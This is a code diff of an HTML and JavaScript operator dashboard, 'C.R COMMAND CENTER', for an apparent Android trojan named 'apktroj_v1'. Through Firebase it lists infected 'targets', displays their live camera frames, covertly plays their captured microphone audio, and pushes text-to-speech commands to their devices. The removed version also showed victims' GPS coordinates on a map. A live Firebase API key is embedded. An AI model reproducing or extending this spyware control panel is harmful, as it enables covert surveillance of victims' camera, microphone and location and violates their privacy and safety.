@@ -3,60 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R COMMAND CENTER V1.5</title>
+    <title>C.R MONITORING CENTER</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
-        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
-        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
+        .border-neon { border: 1px solid #00ff41; box-shadow: 0 0 10px rgba(0,255,65,0.3); }
+        .scanline { background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); background-size: 100% 2px, 3px 100%; pointer-events: none; }
     </style>
 </head>
 <body class="p-4">
-    <div class="max-w-6xl mx-auto">
-        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
+    <div class="max-w-6xl mx-auto relative">
+        <div class="scanline absolute inset-0 opacity-20"></div>
+        
+        <header class="border-b border-green-900 mb-6 pb-2 flex justify-between">
             <div>
-                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER</h1>
-                <p id="auth-info" class="text-xs text-green-400">Connecting...</p>
+                <h1 class="text-xl font-bold tracking-tighter text-red-600">C.R COMMAND CENTER V2.0</h1>
+                <p id="status" class="text-[10px] text-green-700">AWAITING CONNECTION...</p>
+            </div>
+            <div class="text-right">
+                <p id="clock" class="text-xs"></p>
             </div>
         </header>
 
         <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
-            <!-- Target List -->
-            <div class="lg:col-span-1 border-r border-green-900 pr-4">
-                <h2 class="text-lg font-bold mb-4">TARGET AKTIF</h2>
-                <div id="victim-list" class="space-y-2 text-xs">Menunggu koneksi...</div>
+            <!-- Feed Area -->
+            <div class="lg:col-span-3 space-y-4">
+                <div class="border-neon bg-black p-4 aspect-video relative flex items-center justify-center overflow-hidden">
+                    <img id="view-port" class="hidden w-full h-full object-contain">
+                    <div id="no-signal" class="text-green-900 animate-pulse">NO INCOMING SIGNAL</div>
+                    <div class="absolute top-2 left-2 text-[10px] bg-red-600 text-white px-2 py-1 font-bold">LIVE STREAM</div>
+                </div>
+
+                <!-- Hidden Audio untuk mendengar Target -->
+                <audio id="target-listener" autoplay></audio>
             </div>
 
-            <!-- Feed -->
-            <div class="lg:col-span-3">
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <!-- Stream -->
-                    <div class="glitch-border p-4 bg-black">
-                        <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs text-red-500 font-bold uppercase">Live Stream</span>
-                            <span class="live-indicator" id="live-status">● IDLE</span>
-                        </div>
-                        <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden">
-                            <img id="stream-img" src="" class="hidden w-full h-full object-contain">
-                            <span id="placeholder" class="text-gray-700">No Signal...</span>
-                        </div>
-                        <!-- Audio Player -->
-                        <audio id="target-audio" autoplay class="hidden"></audio>
-                        
-                        <div class="mt-4 p-2 bg-gray-900 border border-green-900 rounded">
-                            <p class="text-[10px] text-green-500 font-bold uppercase">Intel Lokasi:</p>
-                            <p class="text-xs text-white" id="lat-long">0.0, 0.0</p>
-                            <a id="map-link" href="#" target="_blank" class="text-[10px] text-blue-400 underline hidden">G-MAPS</a>
-                        </div>
-                    </div>
+            <!-- Control Area -->
+            <div class="space-y-4">
+                <div class="border-neon p-4 bg-black">
+                    <h2 class="text-xs font-bold mb-4 text-blue-500 uppercase">Send Voice (TTS)</h2>
+                    <textarea id="voice-input" class="w-full h-24 bg-gray-900 border border-green-900 p-2 text-green-400 text-xs outline-none mb-3" placeholder="Tulis teks untuk dibacakan di perangkat target..."></textarea>
+                    <button id="btn-send" class="w-full bg-red-900 hover:bg-red-700 text-white font-bold py-2 text-xs transition-all">SEND VOICE COMMAND</button>
+                </div>
 
-                    <!-- Command -->
-                    <div class="glitch-border p-4 bg-black flex flex-col">
-                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Interkom Suara</h3>
-                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Ketik pesan untuk dibacakan di target..."></textarea>
-                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 uppercase text-xs">Kirim Suara</button>
-                    </div>
+                <div class="border-neon p-4 bg-black">
+                    <h2 class="text-xs font-bold mb-2 text-yellow-500 uppercase">Target List</h2>
+                    <div id="target-list" class="text-[9px] space-y-1 overflow-y-auto max-h-40"></div>
                 </div>
             </div>
         </div>
@@ -65,7 +57,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getFirestore, collection, onSnapshot, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
@@ -80,67 +72,57 @@
         const db = getFirestore(app);
         const auth = getAuth(app);
         const appId = "apktroj_v1";
-        let lastAudioTimestamp = 0;
+        let lastAudioPlay = 0;
 
-        onAuthStateChanged(auth, async (user) => {
-            if (!user) await signInAnonymously(auth);
-            else {
-                document.getElementById('auth-info').innerText = "OPERATOR ACTIVE: " + user.uid;
-                initMonitor();
-            }
-        });
-
-        function initMonitor() {
-            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
-            onSnapshot(streamCol, (snap) => {
-                const list = document.getElementById('victim-list');
-                if(!snap.empty) list.innerHTML = '';
+        async function init() {
+            await signInAnonymously(auth);
+            document.getElementById('status').innerText = "CONNECTED AS OPERATOR: " + auth.currentUser.uid;
+            
+            const bufferCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
+            onSnapshot(bufferCol, (snap) => {
+                const list = document.getElementById('target-list');
+                list.innerHTML = "";
                 
                 snap.forEach(docSnap => {
                     const data = docSnap.data();
-                    const img = document.getElementById('stream-img');
-                    const audioEl = document.getElementById('target-audio');
+                    const targetId = docSnap.id.substring(0, 8);
+                    list.innerHTML += `<div class="p-1 border border-green-900 bg-green-950">ID: ${targetId} | LIVE</div>`;
                     
-                    // Update UI
-                    const v = document.createElement('div');
-                    v.className = "p-2 border border-green-900 bg-green-900 bg-opacity-10 mb-1";
-                    v.innerText = `ID: ${data.uid?.substring(0,8)} [ONLINE]`;
-                    list.appendChild(v);
-
-                    // Update Image
+                    // Visual Feed
                     if (data.frame) {
-                        img.src = data.frame;
-                        img.classList.remove('hidden');
-                        document.getElementById('placeholder').classList.add('hidden');
-                        document.getElementById('live-status').innerText = "● STREAMING";
+                        const port = document.getElementById('view-port');
+                        port.src = data.frame;
+                        port.classList.remove('hidden');
+                        document.getElementById('no-signal').classList.add('hidden');
                     }
 
-                    // Play Audio if new
-                    if (data.audio && data.timestamp > lastAudioTimestamp) {
-                        audioEl.src = data.audio;
-                        audioEl.play().catch(e => console.log("User must interact first to play audio"));
-                        lastAudioTimestamp = data.timestamp;
-                    }
-
-                    if (data.location) {
-                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
-                        const mLink = document.getElementById('map-link');
-                        mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
-                        mLink.classList.remove('hidden');
+                    // Audio Feed (Mendengar Target)
+                    if (data.audio && data.timestamp > lastAudioPlay) {
+                        const audio = document.getElementById('target-listener');
+                        audio.src = data.audio;
+                        audio.play().catch(e => console.log("Klik layar untuk aktifkan suara"));
+                        lastAudioPlay = data.timestamp;
                     }
                 });
             });
         }
 
-        document.getElementById('send-voice').onclick = async () => {
-            const txt = document.getElementById('voice-msg').value;
+        document.getElementById('btn-send').onclick = async () => {
+            const txt = document.getElementById('voice-input').value;
             if(!txt) return;
             await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
                 text: txt,
                 timestamp: Date.now()
             });
-            document.getElementById('voice-msg').value = "";
+            document.getElementById('voice-input').value = "";
+            alert("Perintah Suara Dikirim");
         };
+
+        setInterval(() => {
+            document.getElementById('clock').innerText = new Date().toLocaleString();
+        }, 1000);
+
+        init();
     </script>
 </body>
 </html>
